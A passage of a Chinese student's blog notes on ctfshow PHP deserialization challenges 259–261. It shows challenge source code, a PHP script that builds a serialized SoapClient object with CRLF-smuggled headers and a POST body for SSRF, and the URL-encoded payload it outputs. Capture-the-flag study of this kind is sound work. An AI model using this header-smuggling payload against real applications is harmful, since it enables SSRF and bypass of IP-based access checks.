<li><input disabled type="checkbox"> <span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://www.cnblogs.com/hetianlab/p/15194462.html#:~:text=SoapClient%E5%9C%A8%E5%AE%89%E5%85%A8%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8%20%E7%94%B1%E4%BA%8E%20SoapClient%20%E5%8E%9F%E7%94%9F%E7%B1%BB%E4%B8%AD%E5%8C%85%E5%90%AB%20__call%20%E6%96%B9%E6%B3%95%EF%BC%8C%E5%B9%B6%E4%B8%94%E6%88%91%E4%BB%AC%E7%9F%A5%E9%81%93%EF%BC%9A%E5%BD%93%E8%B0%83%E7%94%A8%E4%B8%80%E4%B8%AA%E5%AF%B9%E8%B1%A1%E4%B8%AD%E4%B8%8D%E5%AD%98%E5%9C%A8%E7%9A%84%E6%96%B9%E6%B3%95%E6%97%B6%E5%80%99%EF%BC%8C%E4%BC%9A%E6%89%A7%E8%A1%8C%20call,%28%29%20%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E3%80%82%20%E5%9B%A0%E6%AD%A4%E5%9C%A8CTF%E4%B8%AD%E9%80%9A%E5%B8%B8%E4%BC%9A%E5%87%BA%E7%8E%B0%E4%B8%80%E7%A7%8D%20%E5%AD%98%E5%9C%A8%E8%B0%83%E7%94%A8%E4%B8%8D%E5%AD%98%E5%9C%A8%E7%9A%84%E6%96%B9%E6%B3%95%20%E3%80%81%20%E5%B9%B6%E4%B8%94%E9%9C%80%E8%A6%81%E6%88%91%E4%BB%AC%E4%BC%AA%E9%80%A0%E8%AF%B7%E6%B1%82%E5%A4%B4%20%E7%9A%84%E9%A2%98%E7%9B%AE%E3%80%82">SoapClient&#x539F;&#x751F;&#x7C7B;&#x5728;&#x5F00;&#x53D1;&#x4EE5;&#x53CA;&#x5B89;&#x5168;&#x4E2D;&#x5229;&#x7528; - &#x5408;&#x5929;&#x7F51;&#x5B89;&#x5B9E;&#x9A8C;&#x5BA4; - &#x535A;&#x5BA2;&#x56ED; (cnblogs.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li>
</ul>
<p>&#x4E0A;&#x9762;&#x8FD9;&#x7BC7;&#x8BB2;&#x7684;&#x8FD8;&#x662F;259&#x8FD9;&#x9053;&#x9898;&#xFF0C;&#x4F46;&#x662F;&#x8BB2;&#x7684;&#x5F88;&#x8BE6;&#x7EC6;&#xFF0C;&#x6BD4;Y4&#x5E08;&#x5085;&#x7684;&#x66F4;&#x8BE6;&#x7EC6;&#x4E00;&#x70B9;&#xFF08;&#x7559;&#x7740;&#x660E;&#x5929;&#x505A;&#x9898;&#x7684;&#x65F6;&#x5019;&#x518D;&#x770B;&#x4E00;&#x773C;&#xFF09;&#xFF0C;&#x4E0D;&#x5BF9;Y4&#x5E08;&#x5085;&#x7528;&#x7684;&#x662F;&#x65B0;&#x65B9;&#x6CD5;orz</p>
<ul>
<li><input checked disabled type="checkbox"> <span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://blog.csdn.net/helpluozhao123/article/details/122628430"> Web&#x6838;&#x5FC3;&#x6280;&#x672F;&#x4E4B;Filter&#x8FC7;&#x6EE4;&#x5668;_Code&#x653B;&#x57CE;&#x72EE;&#x7684;&#x535A;&#x5BA2;-CSDN&#x535A;&#x5BA2;_webfilter</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> (&#x8FD9;&#x7BC7;&#x6587;&#x7AE0;&#x4E5F;&#x662F;&#x4ECE;p&#x725B;&#x54EA;&#x91CC;&#x8FC7;&#x6765;&#x7684;&#xFF0C;&#x56E0;&#x4E3A;&#x4E0D;&#x61C2;&#x600E;&#x4E48;&#x7ED5;&#x8FC7;&#x4E86;web&#x6D4F;&#x89C8;&#x5668;filter)</li>
</ul>
<blockquote>
<p>&#x7ED5;&#x8FC7;&#x4F3C;&#x4E4E;&#x662F;&#x56E0;&#x4E3A;&#xFF0C;&#x4F7F;&#x7528;\r\n&#x6CE8;&#x5165;&#x5BFC;&#x81F4;&#x4E86;&#x53EF;&#x4EE5;&#x8BBE;&#x7F6E;xss-filter-protection&#x53EF;&#x4EE5;&#x8BBE;&#x7F6E;&#x4E3A;1&#xFF08;T_T&#x6765;&#x81EA;230327&#x8BC4;&#x8BBA;&#xFF09;</p>
</blockquote>
<p>&#x4E0A;&#x9762;&#x8FD9;&#x7BC7;&#x4E3B;&#x8981;&#x8BB2;&#x4E86;web&#x7684;filter&#x7684;&#x4EE3;&#x7801;&#x5B9E;&#x73B0;&#xFF0C;&#x8FC7;&#x6EE4;&#x548C;&#x653E;&#x5305;&#xFF08;&#x653E;&#x8D70;css&#x6E32;&#x67D3;&#xFF09;&#xFF0C;&#x8BB2;&#x4E86;&#x8FC7;&#x6EE4;&#x5668;&#x7684;&#x539F;&#x7406;&#xFF1B;&#x53C8;&#x8BB2;&#x4E86;&#x6709;&#x4E9B;&#x7F51;&#x7AD9;&#x7531;&#x4E8E;&#x4E00;&#x5B9A;&#x4F1A;&#x8BBF;&#x95EE;&#x4E00;&#x6B21;&#x8FC7;&#x6EE4;&#x5668;&#xFF0C;&#x751A;&#x81F3;&#x628A;&#x90E8;&#x5206;&#x529F;&#x80FD;&#x5199;&#x5728;&#x4E86;&#x8FC7;&#x6EE4;&#x5668;&#x4E2D;</p>
<ul>
<li><p><input disabled type="checkbox"> 
<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/213359.html">&#x5229;&#x7528;PHP&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x89E3;&#x6790;&#x7279;&#x6027;Bypass - FreeBuf&#x7F51;&#x7EDC;&#x5B89;&#x5168;&#x884C;&#x4E1A;&#x95E8;&#x6237;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>   &#x7559;&#x7740;&#x5427;&#xFF0C;&#x73B0;&#x5728;&#x6CA1;&#x770B;&#x61C2;</p>
</li>
<li><p><input checked disabled type="checkbox"> 
<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6654#toc-3">&#x4ECE;&#x4E00;&#x9053;&#x9898;&#x5230;&#x534F;&#x8BAE;&#x5C42;&#x653B;&#x51FB;&#x4E4B;HTTP&#x8BF7;&#x6C42;&#x8D70;&#x79C1; - &#x5148;&#x77E5;&#x793E;&#x533A; (aliyun.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>  &#x770B;&#x4E86;&#x53C8;&#x6CA1;&#x5B8C;&#x5168;&#x770B;&#xFF0C;&#x53EA;&#x77E5;&#x9053;&#x4E86;http&#x8BF7;&#x6C42;&#x8D70;&#x79C1;&#x7684;&#x539F;&#x7406;&#xFF0C;&#x540E;&#x9762;&#x56FD;&#x8D5B;&#x90A3;&#x9053;&#x9898;&#x6709;&#x70B9;&#x4E0D;&#x660E;&#x767D;PHP&#x5B57;&#x7B26;&#x4E32;&#x7279;&#x6027;&#x662F;&#x600E;&#x4E48;&#x7ED5;&#x8FC7;&#x7684;</p>
</li>
<li><p><input checked disabled type="checkbox"> 
<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://www.cnblogs.com/studyskill/p/6972576.html">CRLF&#x653B;&#x51FB;&#x7684;&#x4E00;&#x7BC7;&#x79D1;&#x666E;&#xFF1A;&#x65B0;&#x6D6A;&#x67D0;&#x7AD9;CRLF Injection&#x5BFC;&#x81F4;&#x7684;&#x5B89;&#x5168;&#x95EE;&#x9898;&#xFF08;&#x8F6C;&#xFF09; - studyskill - &#x535A;&#x5BA2;&#x56ED; (cnblogs.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>   &#x7A0D;&#x5FAE;&#x7406;&#x89E3;&#x4E86;&#x4E00;&#x4E0B;&#xFF0C;&#x4F7F;&#x7528;CRLF&#x7ED5;&#x8FC7;webfilter&#xFF0C;&#x914D;&#x5408;xss&#x4F7F;&#x7528;&#xFF0C;</p>
</li>
<li><p><input disabled type="checkbox"> 
&#x8FD9;&#x8FD8;&#x6709;&#x4E00;&#x4E2A;<span class="exturl"><a class="exturl__link" href="file:///F:/QQ%E6%96%87%E4%BB%B6/2022%E6%9A%91%E5%81%87qq%E6%96%87%E4%BB%B6/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%96%87%E4%BB%B6/web259--writeUp.pdf">web259&#x2013;writeUp.pdf</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
</li>
<li><p><input disabled type="checkbox"> 
<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://y4tacker.blog.csdn.net/article/details/110521104"> &#x4ECE;&#x4E00;&#x9053;&#x9898;&#x5B66;&#x4E60;SoapClient&#x4E0E;CRLF&#x7EC4;&#x5408;&#x62F3;_Y4tacker&#x7684;&#x535A;&#x5BA2;-CSDN&#x535A;&#x5BA2;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
</li>
<li><p><input disabled type="checkbox"> 
<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://blog.csdn.net/xin_king/article/details/8720492"> php soapclient&#x7684;&#x4F7F;&#x7528;_iamjianhua&#x7684;&#x535A;&#x5BA2;-CSDN&#x535A;&#x5BA2;_php soapclient</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
</li>
<li><p><input disabled type="checkbox"> 
<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://blog.csdn.net/qq_50589021/article/details/120098403"> ctfshow web &#x53CD;&#x5E8F;&#x5217;&#x5316;(web254-278)_Yn8rt&#x7684;&#x535A;&#x5BA2;-CSDN&#x535A;&#x5BA2;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
</li>
</ul>
<p>&#x4ECE;&#x6700;&#x4E0B;&#x9762;&#x7684;&#x6587;&#x7AE0;&#x51FA;&#x53D1;&#x3002;&#x3002;</p>
<p><code>- [ ] </code></p>
<p>:smile:</p>
<p>&#x7B11;&#x6B7B;&#xFF0C;&#x79BB;&#x4E0A;&#x5B66;&#x8FD8;&#x6709;17&#x5929;&#x3002;</p>
<hr>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#flag.php</span></span><br><span class="line"><span class="variable">$xff</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&apos;,&apos;</span>, <span class="variable">$_SERVER</span>[<span class="string">&apos;HTTP_X_FORWARDED_FOR&apos;</span>]);</span><br><span class="line"><span class="title function_ invoke__">array_pop</span>(<span class="variable">$xff</span>);</span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">array_pop</span>(<span class="variable">$xff</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span>!==<span class="string">&apos;127.0.0.1&apos;</span>){</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&apos;error&apos;</span>);</span><br><span class="line">}<span class="keyword">else</span>{</span><br><span class="line">	<span class="variable">$token</span> = <span class="variable">$_POST</span>[<span class="string">&apos;token&apos;</span>];</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$token</span>==<span class="string">&apos;ctfshow&apos;</span>){</span><br><span class="line">		<span class="title function_ invoke__">file_put_contents</span>(<span class="string">&apos;flag.txt&apos;</span>,<span class="variable">$flag</span>);</span><br><span class="line">	}</span><br><span class="line">}</span><br></pre></td></tr></table></div></figure>

<p>index.php?</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$vip</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&apos;vip&apos;</span>]);</span><br><span class="line"><span class="comment">//vip can get flag one key</span></span><br><span class="line"><span class="variable">$vip</span>-&gt;<span class="title function_ invoke__">getFlag</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Notice: Undefined index: vip in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">6</span></span><br><span class="line"></span><br><span class="line">Fatal error: Uncaught <span class="built_in">Error</span>: Call to a member <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>) <span class="title">on</span> <span class="title">bool</span> <span class="title">in</span> /<span class="title">var</span>/<span class="title">www</span>/<span class="title">html</span>/<span class="title">index</span>.<span class="title">php</span>:8 <span class="title">Stack</span> <span class="title">trace</span>: #0 </span>{main} thrown in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">8</span></span><br></pre></td></tr></table></div></figure>

<p>&#x8003;&#x70B9;&#xFF1A;</p>
<p>&#x8FD9;&#x91CC;&#x9762;&#x7684;getflag&#x662F;&#x672A;&#x77E5;&#x7684;&#xFF0C;&#x5F53;&#x8C03;&#x7528;&#x4E00;&#x4E2A;&#x4E0D;&#x5B58;&#x5728;&#x7684;&#x65B9;&#x6CD5;&#x65F6;&#xFF0C;&#x4F1A;&#x81EA;&#x52A8;&#x4F7F;&#x7528;&#x9B54;&#x672F;&#x65B9;&#x6CD5;__call&#xFF0C;&#x4E8E;&#x662F;&#x8003;&#x8651;&#x7528;soapclient&#x6765;&#x7ED5;&#x8FC7;&#x3002;</p>
<p>&#x8BE5;&#x9898;&#x8FD8;&#x7ED3;&#x5408;&#x4E86;ssrf&#x4E0E;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x77E5;&#x8BC6;&#xFF0C;&#x5728;flag.php&#x91CC;&#x9762;&#x8981;&#x6C42;&#x4ECE;127.0.0.1&#x53BB;&#x8BBF;&#x95EE;&#xFF0C;&#x800C;&#x4E14;&#x4E0D;&#x6B62;&#x6784;&#x9020; &#x4E00;&#x4E2A;&#xFF0C;&#x8981;&#x6C42;&#x591A;&#x6784;&#x9020;&#x51E0;&#x4E2A;&#xFF08;&#x56E0;&#x4E3A;&#x6709;explode&#x5206;&#x5272;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;&#x6709;array_pop&#x51FD;&#x6570;&#x5F39;&#x51FA;ip&#xFF09;</p>
<hr>
<p>&#x5E08;&#x5085;&#x7684;payload&#x91CC;&#x9762;&#x4F7F;&#x7528;&#x4E86;<code>^^</code>&#x6765;&#x5206;&#x5272;&#x6BCF;&#x4E2A;&#x8BF7;&#x6C42;&#x5934;&#xFF0C;&#x7136;&#x540E;&#x540E;&#x9762;&#x7528;str_replace&#x6765;&#x66FF;&#x6362;<code>^^</code>&#x4E3A;<code>\r\n</code>,&#x4ECE;&#x800C;&#x5229;&#x7528;crlf</p>
<p>&#x53E6;&#x5916;Y4&#x5E08;&#x5085;&#x4F7F;&#x7528;&#x4E86;requestbin.net&#x6765;&#x68C0;&#x67E5;&#x53D1;&#x9001;&#x5230;&#x989D;&#x8BF7;&#x6C42;&#x6570;&#x636E;&#xFF0C;&#x4E0D;&#x77E5;&#x9053;&#x662F;&#x4EC0;&#x4E48;&#x5148;&#x8BB0;&#x4E0B;&#x5427;&#xFF08;&#x770B;&#x9519;&#x4E86;&#xFF0C;&#x8FD9;&#x4E2A;&#x7F51;&#x7AD9;&#x662F;&#x7528;&#x6765;&#x6D4B;&#x8BD5;soapclient&#x7684;&#x3002;&#x3002;&#x3010;&#x6765;&#x81EA;230327&#x3011;&#xFF09;</p>
<hr>
<p>&#x89C6;&#x9891;wp</p>
<p>&#x89C6;&#x9891;&#x91CC;&#x9762;&#xFF0C;&#x7FA4;&#x4E3B;&#x5148;&#x5728;&#x672C;&#x5730;&#x6784;&#x9020;&#x4E86;payload&#xFF0C;&#x7136;&#x540E;&#x4F7F;&#x7528;Windowspowershell&#x8FDB;&#x884C;&#x76D1;&#x542C;&#xFF0C;&#x8FD9;&#x6837;&#x5C31;&#x53EF;&#x4EE5;&#x5B9E;&#x65F6;&#x76D1;&#x6D4B;&#x53D1;&#x9001;&#x7684;&#x8BF7;&#x6C42;&#x5305;</p>
<p>&#x6CE8;&#x610F;</p>
<ul>
<li><p>soapclient&#x9700;&#x8981;&#x6709;&#x4E24;&#x4E2A;options&#xFF0C;&#x4E00;&#x4E2A;&#x662F;uri,&#x4E00;&#x4E2A;&#x662F;location</p>
</li>
<li><p>soapclient&#x7C7B;&#x5BF9;&#x8C61;&#x9700;&#x8981; &#x4E24;&#x4E2A;&#x53C2;&#x6570;&#xFF1A;&#x4E00;&#x4E2A;&#x662F;&#x5B57;&#x7B26;&#x4E32;&#x5F62;&#x5F0F;&#x7684;<strong>wsdl</strong>&#xFF0C;&#x53E6;&#x4E00;&#x4E2A;&#x662F;&#x6570;&#x7EC4;&#x5F62;&#x5F0F;&#x7684;<strong>options</strong></p>
</li>
<li><ul>
<li><input disabled type="checkbox"> <span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://blog.csdn.net/xuchen_si/article/details/21552285?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_title~default-0-21552285-blog-17359053.experiment_layer_sa&amp;spm=1001.2101.3001.4242.1&amp;utm_relevant_index=2"> PHP SOAP&#x8BE6;&#x89E3;_xuchen_si&#x7684;&#x535A;&#x5BA2;-CSDN&#x535A;&#x5BA2;_php soap</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li>
</ul>
</li>
<li><p>HTTP&#x8BF7;&#x6C42;&#x5934;&#x4E4B;&#x95F4;&#x7684;&#x53C2;&#x6570;&#x7528;&#x4E00;&#x4E2A;\r\n&#x5206;&#x9694;<br>HTTP Header&#x4E0E;HTTP Body&#x662F;&#x7528;&#x4E24;&#x4E2A;\r\n&#x5206;&#x9694;&#x7684;</p>
</li>
</ul>
<hr>
<p>&#x81EA;&#x5DF1;&#x672C;&#x5730;&#x6D4B;&#x8BD5;&#x51FA;&#x4E0D;&#x6765;&#xFF0C;&#x662F;&#x7AEF;&#x53E3;&#x5F00;&#x9519;&#x4E86;&#x5417;&#xFF1F;&#xFF1F;</p>
<p>&#x6CA1;&#x9519;&#xFF0C;&#xFF0C;&#xFF0C;&#x7AEF;&#x53E3;&#x53F7;&#x5F00;&#x9519;&#x4E86;&#xFF0C;&#x672C;&#x5730;&#x7684;&#x7AEF;&#x53E3;&#x53F7;&#x662F;80</p>
<p>&#x6211;&#x60F3;&#x77E5;&#x9053;nc&#x3002;&#x3002;&#x4E3A;&#x4EC0;&#x4E48;nc&#x4E0D;&#x8D77;</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#x81EA;&#x5DF1;&#x672C;&#x5730;&#x6D4B;&#x8BD5;&#x7684;url</span><br><span class="line">localhost:<span class="number">3000</span>/<span class="number">259</span>.php</span><br><span class="line"></span><br><span class="line">&#x7FA4;&#x4E3B;&#x7684;url</span><br><span class="line"><span class="number">127.0</span>.<span class="number">0.1</span>/payload.php</span><br><span class="line"></span><br><span class="line">&#x7B2C;&#x4E00;&#x6B21;&#x6D4B;&#x8BD5;&#x7684;&#x5185;&#x5BB9;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$client</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,</span><br><span class="line">                         <span class="keyword">array</span>(<span class="string">&apos;uri&apos;</span>=&gt;<span class="string">&apos;http://127.0.0.1:9999/&apos;</span>,</span><br><span class="line">                               <span class="string">&apos;location&apos;</span>=&gt;<span class="string">&apos;http://127.0.0.1:9999/ctfshow&apos;</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$client</span>-&gt;<span class="title function_ invoke__">getflag</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&#x62A5;&#x9519;&#x662F;&#xFF1A;</span><br><span class="line">    </span><br><span class="line">Fatal error: Uncaught SoapFault exception: [HTTP] Could not connect to host in D:\phpstudy_pro\WWW\show&#x5B66;&#x4E60;\&#x53CD;&#x5E8F;&#x5217;&#x5316;\<span class="number">259</span>.php:<span class="number">4</span> Stack trace: <span class="comment">#0 [internal function]: SoapClient-&gt;__doRequest(&apos;&lt;?xml version=&quot;...&apos;, &apos;http://127.0.0....&apos;, &apos;http://127.0.0....&apos;, 1, 0) #1 D:\phpstudy_pro\WWW\show&#x5B66;&#x4E60;\&#x53CD;&#x5E8F;&#x5217;&#x5316;\259.php(4): SoapClient-&gt;__call(&apos;getflag&apos;, Array) #2 {main} thrown in D:\phpstudy_pro\WWW\show&#x5B66;&#x4E60;\&#x53CD;&#x5E8F;&#x5217;&#x5316;\259.php on line 4</span></span><br><span class="line"><span class="comment">//&#xFF08;&#x4FEE;&#x6539;&#x4E86;soap.wsdl_cache_enabled=0&#xFF09;</span></span><br><span class="line">---</span><br><span class="line">    </span><br></pre></td></tr></table></div></figure>



<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ua</span> = <span class="string">&quot;ctfshow\r\nX-Forwarded-For:127.0.0.1,127.0.0.1,127.0.0.1\r\nConten-Type:application/x-www-form-urlencoded\r\n</span></span><br><span class="line"><span class="string">Content-Length:13\r\n\r\ntoken=ctfshow&quot;</span>;</span><br><span class="line"><span class="variable">$client</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&apos;uri&apos;</span>=&gt;<span class="string">&apos;http://127.0.0.1/&apos;</span>,<span class="string">&apos;location&apos;</span>=&gt;<span class="string">&apos;http://127.0.0.1/flag.php&apos;</span>,<span class="string">&apos;user_agent&apos;</span>=&gt;<span class="variable">$ua</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//$client-&gt;getflag();</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$client</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>





<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">O%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>SoapClient%<span class="number">22</span>%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>uri%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A17%<span class="number">3</span>A%<span class="number">22</span>http%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>F127.<span class="number">0.0</span>.<span class="number">1</span>%<span class="number">2</span>F%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>location%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A25%<span class="number">3</span>A%<span class="number">22</span>http%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>F127.<span class="number">0.0</span>.<span class="number">1</span>%<span class="number">2</span>Fflag.php%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A15%<span class="number">3</span>A%<span class="number">22</span>_stream_context%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A0%<span class="number">3</span>Bs%<span class="number">3</span>A11%<span class="number">3</span>A%<span class="number">22</span>_user_agent%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A139%<span class="number">3</span>A138%<span class="number">22</span>ctfshow%<span class="number">0</span>D%<span class="number">0</span>AX-Forwarded-For%<span class="number">3</span>A127.<span class="number">0.0</span>.<span class="number">1</span>%<span class="number">2</span>C127.<span class="number">0.0</span>.<span class="number">1</span>%<span class="number">2</span>C127.<span class="number">0.0</span>.<span class="number">1</span>%<span class="number">0</span>D%<span class="number">0</span>AConten-Type%<span class="number">3</span>Aapplication%<span class="number">2</span>Fx-www-form-urlencoded%<span class="number">0</span>D%<span class="number">0</span>AContent-Length%<span class="number">3</span>A13%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">0</span>D%<span class="number">0</span>Atoken%<span class="number">3</span>Dctfshow%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A13%<span class="number">3</span>A%<span class="number">22</span>_soap_version%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A1%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></div></figure>





<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>SoapClient%<span class="number">22</span>%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>uri%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A17%<span class="number">3</span>A%<span class="number">22</span>http%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>F127.<span class="number">0.0</span>.<span class="number">1</span>%<span class="number">2</span>F%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>location%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A25%<span class="number">3</span>A%<span class="number">22</span>http%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>F127.<span class="number">0.0</span>.<span class="number">1</span>%<span class="number">2</span>Fflag.php%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A15%<span class="number">3</span>A%<span class="number">22</span>_stream_context%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A0%<span class="number">3</span>Bs%<span class="number">3</span>A11%<span class="number">3</span>A%<span class="number">22</span>_user_agent%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A139%<span class="number">3</span>A%<span class="number">22</span>ctfshow%<span class="number">0</span>D%<span class="number">0</span>AX-Forwarded-For%<span class="number">3</span>A127.<span class="number">0.0</span>.<span class="number">1</span>%<span class="number">2</span>C127.<span class="number">0.0</span>.<span class="number">1</span>%<span class="number">2</span>C127.<span class="number">0.0</span>.<span class="number">1</span>%<span class="number">0</span>D%<span class="number">0</span>AConten-Type%<span class="number">3</span>Aapplication%<span class="number">2</span>Fx-www-form-urlencoded%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">0</span>D%<span class="number">0</span>AContent-Length%<span class="number">3</span>A13%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">0</span>D%<span class="number">0</span>Atoken%<span class="number">3</span>Dctfshow%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A13%<span class="number">3</span>A%<span class="number">22</span>_soap_version%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A1%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></div></figure>


        <h3 id="260">
          <a href="#260" class="heading-link"><i class="fas fa-link"></i></a><a href="#260" class="headerlink" title="260"></a>260</h3>
      <p>&#x6784;&#x9020;&#x7C7B;&#x4F20;&#x53C2;&#x5373;&#x53EF;</p>

        <h3 id="261">
          <a href="#261" class="heading-link"><i class="fas fa-link"></i></a><a href="#261" class="headerlink" title="261"></a>261</h3>
      <p>&#x8003;&#x70B9;&#xFF1A;<code>__wakeup</code>&#x548C;<code>__sleep</code>&#x65B9;&#x6CD5;&#x7684;&#x8C03;&#x7528;&#x6761;&#x4EF6;&#xFF0C;&#x4EE5;&#x53CA;&#x5E8F;&#x5217;&#x5316;serialize()&#x65B9;&#x6CD5;&#x8C03;&#x7528;&#x6761;&#x4EF6;</p>
